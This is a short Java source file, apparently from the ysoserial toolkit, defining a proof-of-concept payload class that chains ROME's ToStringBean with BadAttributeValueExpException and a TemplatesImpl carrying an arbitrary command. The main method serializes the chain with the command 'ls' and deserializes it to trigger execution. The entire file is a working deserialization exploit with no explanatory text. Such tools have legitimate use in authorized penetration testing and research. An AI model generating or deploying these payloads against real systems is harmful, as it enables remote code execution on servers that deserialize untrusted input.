package ysoserial.payloads.tabbyGadgetChains.rome;

import com.sun.syndication.feed.impl.ToStringBean;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.util.Gadgets;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;

public class Poc2 implements ObjectPayload<Object> {

    public Object getObject ( String command ) throws Exception {
        Object o = Gadgets.createTemplatesImpl(command);

        ToStringBean toStringBean = new ToStringBean(Templates.class,o);
        BadAttributeValueExpException exception = new BadAttributeValueExpException("test");
        Field field     = BadAttributeValueExpException.class.getDeclaredField("val");
        field.setAccessible(true);
        field.set(exception, toStringBean);
        return exception;

    }


    public static void main ( final String[] args ) throws Exception {
//        PayloadRunner.run(Poc2.class, args);
        Object o = Gadgets.createTemplatesImpl("ls");

        ToStringBean toStringBean = new ToStringBean(Templates.class,o);
        BadAttributeValueExpException exception = new BadAttributeValueExpException("test");
        Field field     = BadAttributeValueExpException.class.getDeclaredField("val");
        field.setAccessible(true);
        field.set(exception, toStringBean);
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./ccf31"));
        outputStream.writeObject(exception);
        outputStream.close();
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./ccf31"));
        inputStream.readObject();
    }

}